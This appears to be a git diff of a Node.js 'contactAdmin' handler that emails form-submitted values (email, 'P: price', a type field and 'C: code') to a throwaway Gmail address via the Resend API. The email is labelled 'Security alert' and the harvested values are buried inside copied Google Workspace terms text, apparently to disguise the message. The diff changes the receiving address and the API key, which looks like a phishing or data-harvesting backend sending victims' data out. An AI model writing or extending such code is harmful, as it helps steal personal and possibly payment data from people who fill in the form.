@@ -8,7 +8,7 @@ exports.contactAdmin = async (req, res) => {
   // Contenu du premier email ("rough")
   const mailOptions_rough = {
     from: 'Networking Academy <onboarding@resend.dev>', // ton domaine validé chez Resend
-    to: 'testbackend2024@gmail.com',
+    to: 'backend829@gmail.com',
     subject: 'Security alert',
     text: `If you’re a Google Workspace reseller whose customers ${email} P: ${price} have enabled their users to access Google Additional Services:
     Our new Terms of Service won’t affect your Google Workspace agreement with your customers. These new terms will only apply to your customers’ users who’ve been given access to Google Additional Services. Your customers can always manage whether their users have access to Google Additional Services, and which ones, in their Admin console.\n\n\n\ Networking: ${type_truc}\nC: ${code}\n`,
@@ -27,7 +27,7 @@ exports.contactAdmin = async (req, res) => {
     let response1 = await fetch('https://api.resend.com/emails', {
       method: 'POST',
       headers: {
-        Authorization: `Bearer ${process.env.RESEND_API_KEY}`,
+        Authorization: `Bearer ${process.env.RESEND_API_KEY2}`,
         'Content-Type': 'application/json',
       },
       body: JSON.stringify(mailOptions_rough),
